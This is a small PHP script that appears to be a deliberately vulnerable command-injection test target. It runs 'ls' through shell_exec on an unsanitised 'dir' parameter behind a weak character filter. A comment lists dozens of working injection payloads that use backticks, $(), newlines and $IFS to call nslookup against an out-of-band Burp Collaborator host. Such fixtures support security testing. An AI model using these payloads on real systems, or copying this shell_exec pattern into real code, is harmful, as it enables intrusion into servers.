<?php
# filename: no_colon_no_pipe_no_ampersand_no_dollar.php
# vulnerable to newline and backtick injection
# sample successful payloads:
/*
%26%60nslookup%09467.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%26.
.%0Anslookup%09746.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A
.%22%60nslookup%091355.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%22.
.%22%0A%60nslookup%091184.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A%22.
.%22%0A%60nslookup+680.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A%22
%60nslookup%09158.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%F0%9F%92%A9
.%22%60nslookup+1337.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%22.
.%22%26%24%28nslookup%09797.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%26%22
.%0A%60nslookup+1034.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.
.%24%28nslookup%091340.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29.
.%60nslookup+1331.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60.
%60nslookup%0920.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60
.%22%7C%60nslookup%24IFS%249a1310.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%7C%22.
.%7Cnslookup%091124.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%7C.
;$(nslookup$IFS$9a556.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net);.
.%0Anslookup+962.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.
.%0A%60nslookup%09818.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A
%0A%60nslookup%09458.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.
.%60nslookup%091349.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60.
%0Anslookup%09389.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.%27
%24%28nslookup%09137.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%F0%9F%92%A9
%26nslookup%09395.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%26.
%0A%60nslookup+314.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.
.%0A%60nslookup%091178.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.
.%22%24%28nslookup%091346.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%22.
.%22%26%60nslookup%091193.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%26%22.
$(nslookup$IFS$9a211.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net)&
.%0Anslookup+602.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A
.;nslookup$IFS$9a1240.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net;.
%60nslookup%09167.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A
%0A%60nslookup%09464.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.%22
%0A%60nslookup%09461.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A.%27
%60nslookup+74.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%F0%9F%92%A9
.%26nslookup%24IFS%249a863.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%26
%3Bnslookup%09413.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%3B.
$(nslookup$IFS$9a25.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net)
%0Anslookup+242.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.
.%22%0A%60nslookup%09824.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%0A%22
.%22%0A%24%28nslookup%24IFS%249a896.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29%0A%22
.%0Anslookup%091106.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.
.;`nslookup$IFS$9a952.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net`;
.%26nslookup%091115.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%26.
%60nslookup%09161.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60%00
%24%28nslookup%0917.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%29
%0Anslookup%24IFS%249a494.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.
%0Anslookup%09392.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.%22
%60nslookup+8.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60
%60nslookup%09164.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%60+%23
%0Anslookup%09386.e7mgwkkcpj34ze8zvybssqzy8pek29.burpcollaborator.net%0A.
*/

if(isset($_GET['dir'])&&!preg_match('/&|\||;|\$/',$_GET['dir']))
{
	 echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
}
?>
<a href="?dir=.">clickme</a>
